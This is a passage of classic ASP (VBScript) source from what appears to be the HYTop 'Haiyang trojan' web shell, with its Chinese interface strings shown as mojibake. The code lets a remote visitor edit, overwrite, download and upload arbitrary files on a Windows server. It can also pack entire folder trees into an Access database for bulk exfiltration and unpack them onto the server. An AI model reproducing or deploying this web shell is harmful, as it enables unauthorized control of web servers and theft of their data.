               alertThenClose("ÄúËùÒª´ò¿ªµÄÎÄ¼þ²»ÔÚ±¾Õ¾µãÄ¿Â¼ÏÂ\nÄú¿ÉÒÔ³¢ÊÔ°ÑÒª´ò¿ª(ÏÂÔØ)µÄÎÄ¼þÕ³Ìùµ½\nÕ¾µãÄ¿Â¼ÏÂ,È»ºóÔÙ´ò¿ª(ÏÂÔØ)!")
               Response.End
           End If
       End Sub

       Sub showEdit(thePath, strMethod)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim theFile, unEditableExt

           If Right(thePath, 1) = "\" Then
               alertThenClose("±à¼ÎÄ¼þ¼Ð²Ù×÷ÊÇ·Ç·¨µÄ.")
               Response.End
           End If

           unEditableExt = "$exe$dll$bmp$wav$mp3$wma$ra$wmv$ram$rm$avi$mgp$png$tiff$gif$pcx$jpg$com$msi$scr$rar$zip$ocx$sys$mdb$"

           echo "<style>body{border:none;overflow:hidden;background-color:buttonface;}</style>"
           echo "<body topmargin=9>"
           echo "<form method=post style='margin:0;width:100%;height:100%;'>"
           echo "<textarea name=fileContent style='width:100%;height:90%;'>"
           If strMethod = "stream" Then
               echo HtmlEncode(streamLoadFromFile(thePath))
            Else
               Set theFile = fsoX.OpenTextFile(thePath, 1)
               echo HtmlEncode(theFile.ReadAll())
               theFile.Close
               Set theFile = Nothing
           End If
           echo "</textarea><hr/>"
           echo "<div align=right>"
           echo "±£´æÎª:<input size=30 name=thePath value=""" & HtmlEncode(thePath) & """> "
           echo "<input type=checkbox name='windowStatus' id=windowStatus"
           If Request.Cookies(m & "windowStatus") = "True" Then
               echo " checked"
           End If
           echo "><label for=windowStatus>±£´æºó¹Ø±Õ´°¿Ú</label> "
           echo "<input type=submit value=' ±£´æ '><input type=hidden value='saveFile' name=theAct>"
           echo "<input type=reset value=' »Ö¸´ '>"
           echo "<input type=button value=' Çå¿Õ ' onclick=this.form.fileContent.innerText='';>"
           echo strJsCloseMe & "</div>"
           echo "</form>"
           echo "</body><br/>"

       End Sub

       Sub saveToFile(thePath, strMethod)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim fileContent, windowStatus
           fileContent = Request("fileContent")
           windowStatus = Request("windowStatus")

           If strMethod = "stream" Then
               streamSaveToFile thePath, fileContent
               chkErr(Err)
            Else
               fsoSaveToFile thePath, fileContent
               chkErr(Err)
           End If

           If windowStatus = "on" Then
               Response.Cookies(m & "windowStatus") = "True"
               Response.Write "<script>window.close();</script>"
            Else
               Response.Cookies(m & "windowStatus") = "False"
               Call showEdit(thePath, strMethod)
           End If
       End Sub

       Sub fsoSaveToFile(thePath, fileContent)
           Dim theFile
           Set theFile = fsoX.OpenTextFile(thePath, 2, True)
           theFile.Write fileContent
           theFile.Close
           Set theFile = Nothing
       End Sub

       Function streamLoadFromFile(thePath)
           Dim stream
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Set stream = Server.CreateObject("adodb.stream")
           With stream
               .Type=2
               .Mode=3
               .Open
               .LoadFromFile thePath
               .LoadFromFile thePath
               If Request("pageName") <> "TxtSearcher" Then
                   chkErr(Err)
               End If
               .Charset="gb2312"
               .Position=2
               streamLoadFromFile=.ReadText()
               .Close
           End With
           Set stream = Nothing
       End Function

       Sub downTheFile(thePath)
           Response.Clear
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim stream, fileName, fileContentType

           fileName = split(thePath,"\")(uBound(split(thePath,"\")))
           Set stream = Server.CreateObject("adodb.stream")
           stream.Open
           stream.Type = 1
           stream.LoadFromFile(thePath)
           chkErr(Err)
           Response.AddHeader "Content-Disposition", "attachment; filename=" & fileName
           Response.AddHeader "Content-Length", stream.Size
           Response.Charset = "UTF-8"
           Response.ContentType = "application/octet-stream"
           Response.BinaryWrite stream.Read
           Response.Flush
           stream.Close
           Set stream = Nothing
       End Sub

       Sub showUpload(thePath, pageName)
           echo "<style>body{margin:8;overflow:hidden;}</style>"
           echo "<form method=post enctype='multipart/form-data' action='?pageName=" & pageName & "&theAct=upload&thePath=" & UrlEncode(thePath) & "' onsubmit='this.Submit.disabled=true;;'>"
           echo "ÉÏ´«ÎÄ¼þ: <input name=file type=file size=31><br/>±£´æÎª: "
           echo "<input name=fileName type=text value=""" & HtmlEncode(thePath) & """ size=33>"
           echo "<input type=checkbox name=writeMode value=True>¸²¸ÇÄ£Ê½<hr/>"
           echo "<input name=Submit type=submit id=Submit value='ÉÏ ´«' onClick=""this.form.action+='&fileName='+this.form.fileName.value+'&theFile='+this.form.file.value+'&overWrite='+this.form.writeMode.checked;"">"
           echo  strJsCloseMe
           echo "</form>"
       End Sub

       Sub streamUpload(thePath)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Server.ScriptTimeOut = 5000
           Dim i, j, info, stream, streamT, theFile, fileName, overWrite, fileContent
           theFile = Request("theFile")
           fileName = Request("fileName")
           overWrite = Request("overWrite")

           If InStr(fileName, ":") <= 0 Then
               fileName = thePath & fileName
           End If

           Set stream = Server.CreateObject("adodb.stream")
           Set streamT = Server.CreateObject("adodb.stream")

           With stream
               .Type = 1
               .Mode = 3
               .Open
               .Write Request.BinaryRead(Request.TotalBytes)
               .Position = 0
               fileContent = .Read()
               i = InStrB(fileContent, chrB(13) & chrB(10))
               info = LeftB(fileContent, i - 1)
               i = Len(info) + 2
               i = InStrB(i, fileContent, chrB(13) & chrB(10) & chrB(13) & chrB(10)) + 4 - 1
               j = InStrB(i, fileContent, info) - 1
               streamT.Type = 1
               streamT.Mode = 3
               streamT.Open
               stream.position = i
               .CopyTo streamT, j - i - 2
               If overWrite = "true" Then
                   streamT.SaveToFile fileName, 2
                Else
                   streamT.SaveToFile fileName
               End If
               If Err.Number = 3004 Then
                   Err.Clear
                   fileName = fileName & "\" & Split(theFile, "\")(UBound(Split(theFile ,"\")))
                   If overWrite="true" Then
                       streamT.SaveToFile fileName, 2
                    Else
                       streamT.SaveToFile fileName
                   End If
               End If
               chkErr(Err)
               echo("<script language=""javascript"">alert('ÎÄ¼þÉÏ´«³É¹¦!\n" & Replace(fileName, "\", "\\") & "');</script>")
               streamT.Close
               .Close
           End With

           Set stream = Nothing
           Set streamT = Nothing
       End Sub

       Function getDriveType(num)
           Select Case num
               Case 0
                   getDriveType = "Î´Öª"
               Case 1
                   getDriveType = "¿ÉÒÆ¶¯´ÅÅÌ"
               Case 2
                   getDriveType = "±¾µØÓ²ÅÌ"
               Case 3
                   getDriveType = "ÍøÂç´ÅÅÌ"
               Case 4
                   getDriveType = "CD-ROM"
               Case 5
                   getDriveType = "RAM ´ÅÅÌ"
           End Select
       End Function

       Function getFileIcon(extName)
           Select Case LCase(extName)
               Case "vbs", "h", "c", "cfg", "pas", "bas", "log", "asp", "txt", "php", "ini", "inc", "htm", "html", "xml", "conf", "config", "jsp", "java", "htt", "lst", "aspx", "php3", "php4", "js", "css", "asa"
                   getFileIcon = "Wingdings>2"
               Case "wav", "mp3", "wma", "ra", "wmv", "ram", "rm", "avi", "mpg"
                   getFileIcon = "Webdings>¡¤"
               Case "jpg", "bmp", "png", "tiff", "gif", "pcx", "tif"
                   getFileIcon = "'webdings'>&#159;"
               Case "exe", "com", "bat", "cmd", "scr", "msi"
                   getFileIcon = "Webdings>1"
               Case "sys", "dll", "ocx"
                   getFileIcon = "Wingdings>&#255;"
               Case Else
                   getFileIcon = "'Wingdings 2'>/"
           End Select
       End Function

       Function getStartType(num)
           Select Case num
               Case 2
                   getStartType = "×Ô¶¯"
               Case 3
                   getStartType = "ÊÖ¶¯"
               Case 4
                   getStartType = "ÒÑ½ûÓÃ"
           End Select
       End Function

       Sub PageAddToMdb()
           Dim theAct, thePath
           theAct = Request("theAct")
           thePath = Request("thePath")
           Server.ScriptTimeOut = 5000

           showTitle("ÎÄ¼þ¼Ð´ò°ü/½â¿ªÆ÷")

           If theAct = "addToMdb" Then
               addToMdb(thePath)
               alertThenClose("²Ù×÷Íê³É!")
               Response.End
           End If
           If theAct = "releaseFromMdb" Then
               unPack(thePath)
               alertThenClose("²Ù×÷Íê³É!")
               Response.End
           End If

           echo "ÎÄ¼þ¼Ð´ò°ü:<br/>"
           echo "<form method=post target=_blank>"
           echo "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
           echo "<input type=hidden value=addToMdb name=theAct>"
           echo "<select name=theMethod><option value=fso>FSO</option><option value=app>ÎÞFSO</option>"
           echo "</select>"
           echo "<br><input type=submit value='¿ªÊ¼´ò°ü'>"
           echo "<hr/>×¢: ´ò°üÉú³ÉHYTop.mdbÎÄ¼þ,Î»ÓÚº£ÑôÄ¾ÂíÍ¬¼¶Ä¿Â¼ÏÂ"
           echo "</form>"

           echo "<hr/>ÎÄ¼þ°ü½â¿ª(ÐèFSOÖ§³Ö):<br/>"
           echo "<form method=post target=_blank>"
           echo "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & "\HYTop.mdb"" size=80>"
           echo "<input type=hidden value=releaseFromMdb name=theAct><input type=submit value='°ïÎÒ½â¿ª'>"
           echo "<hr/>×¢: ½â¿ªÀ´µÄËùÓÐÎÄ¼þ¶¼Î»ÓÚº£ÑôÄ¾ÂíÍ¬¼¶Ä¿Â¼ÏÂ"
           echo "</form>"


           echo "<hr/>Powered By Marcos 2005.02"
       End Sub

       Sub addToMdb(thePath)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim rs, conn, stream, connStr, adoCatalog
           Set rs = Server.CreateObject("ADODB.RecordSet")
           Set stream = Server.CreateObject("ADODB.Stream")
           Set conn = Server.CreateObject("ADODB.Connection")
           Set adoCatalog = Server.CreateObject("ADOX.Catalog")
           connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & Server.MapPath("HYTop.mdb")

           adoCatalog.Create connStr
           conn.Open connStr
           conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")

           stream.Open
           stream.Type = 1
           rs.Open "FileData", conn, 3, 3

           If Request("theMethod") = "fso" Then
               fsoTreeForMdb thePath, rs, stream
            Else
               saTreeForMdb thePath, rs, stream
           End If

           rs.Close
           Conn.Close
           stream.Close
           Set rs = Nothing
           Set conn = Nothing
           Set stream = Nothing
           Set adoCatalog = Nothing
       End Sub

       Function fsoTreeForMdb(thePath, rs, stream)
           Dim item, theFolder, folders, files, sysFileList
           sysFileList = "$HYTop.mdb$HYTop.ldb$"
           If fsoX.FolderExists(thePath) = False Then
               showErr(thePath & " Ä¿Â¼²»´æÔÚ»òÕß²»ÔÊÐí·ÃÎÊ!")
           End If
           Set theFolder = fsoX.GetFolder(thePath)
           Set files = theFolder.Files
           Set folders = theFolder.SubFolders

           For Each item In folders
               fsoTreeForMdb item.Path, rs, stream
           Next

           For Each item In files
               If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
                   rs.AddNew
                   rs("thePath") = Mid(item.Path, 4)
                   stream.LoadFromFile(item.Path)
                   rs("fileContent") = stream.Read()
                   rs.Update
               End If
           Next

           Set files = Nothing
           Set folders = Nothing
           Set theFolder = Nothing
       End Function

       Sub unPack(thePath)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Server.ScriptTimeOut = 5000
           Dim rs, ws, str, conn, stream, connStr, theFolder
           str = Server.MapPath(".") & "\"
           Set rs = CreateObject("ADODB.RecordSet")
           Set stream = CreateObject("ADODB.Stream")
           Set conn = CreateObject("ADODB.Connection")
           connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & thePath & ";"

           conn.Open connStr
           rs.Open "FileData", conn, 1, 1
           stream.Open
           stream.Type = 1

           Do Until rs.Eof
               theFolder = Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
               If fsoX.FolderExists(str & theFolder) = False Then
                   createFolder(str & theFolder)
               End If
               stream.SetEos()
               stream.Write rs("fileContent")
               stream.SaveToFile str & rs("thePath"), 2
               rs.MoveNext
           Loop

           rs.Close
           conn.Close
           stream.Close
           Set ws = Nothing
           Set rs = Nothing
           Set stream = Nothing
           Set conn = Nothing
       End Sub

       Sub createFolder(thePath)
           Dim i
           i = Instr(thePath, "\")
           Do While i > 0
               If fsoX.FolderExists(Left(thePath, i)) = False Then
                   fsoX.CreateFolder(Left(thePath, i - 1))
               End If
               If InStr(Mid(thePath, i + 1), "\") Then
                   i = i + Instr(Mid(thePath, i + 1), "\")
                Else
                   i = 0
               End If
           Loop
       End Sub

       Sub saTreeForMdb(thePath, rs, stream)
           Dim item, theFolder, sysFileList
           sysFileList = "$HYTop.mdb$HYTop.ldb$"
           Set theFolder = saX.NameSpace(thePath)

           For Each item In theFolder.Items
               If item.IsFolder = True Then
                   saTreeForMdb item.Path, rs, stream
                Else
                   If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
                       rs.AddNew
                       rs("thePath") = Mid(item.Path, 4)
                       stream.LoadFromFile(item.Path)
                       rs("fileContent") = stream.Read()
                       rs.Update
                   End If
               End If
           Next

           Set theFolder = Nothing
       End Sub
   %>
